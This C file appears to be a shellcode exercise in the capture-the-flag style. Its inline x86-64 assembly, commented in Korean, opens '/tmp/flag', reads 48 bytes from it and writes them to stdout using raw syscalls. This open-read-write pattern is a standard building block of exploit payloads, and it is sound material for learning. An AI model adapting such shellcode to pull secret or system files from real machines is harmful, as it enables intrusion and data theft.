__asm__(
    ".global run_sh\n"
    "run_sh:\n"
    
    
    "push 0x67					# 'g' 스택에 넣기\n"
    "mov rax, 0x616c662f706d742f		# rax = '/tmp/fla'\n"
    "push rax					# '/tmp/fla' 스택에 넣기\n"
    "mov rdi, rsp				# rdi = '/tmp/flag'\n"
    "xor rsi, rsi				# rsi = 0 (RD_ONLY)\n"
    "xor rdx, rdx				# rdx = 0 (NULL)\n"
    "mov rax, 0x2				# rax = 2 (open)\n"
    "syscall    				# open('/tmp/flag', RD_ONLY, NULL)\n"
    "\n"
    
    "mov rdi, rax				# rdi = fd\n"
    "mov rsi, rsp				# rsi = rsp\n"
    "sub rsi, 0x30				# rsi = rsp - 0x30 (buf)\n"
    "mov rdx, 0x30				# rdx = 0x30 (size)\n"
    "mov rax, 0x0    				# rax = 0 (read)\n"
    "syscall    				# read(fd, buf, 0x30)\n"
    "\n"
    
    "mov rdi, 0x1				# rdi = 0x1 (stdout)\n"
    "mov rax, 0x1				# rax = 0x1 (write)\n"
    "syscall    				# write(1, buf, 0x30)\n"
    "\n"
    
    
    "xor rdi, rdi      				# rdi = 0\n"
    "mov rax, 0x3c	  			# rax = sys_exit\n"
    "syscall		   			# exit(0)");
    
void run_sh();

int main() { run_sh(); }
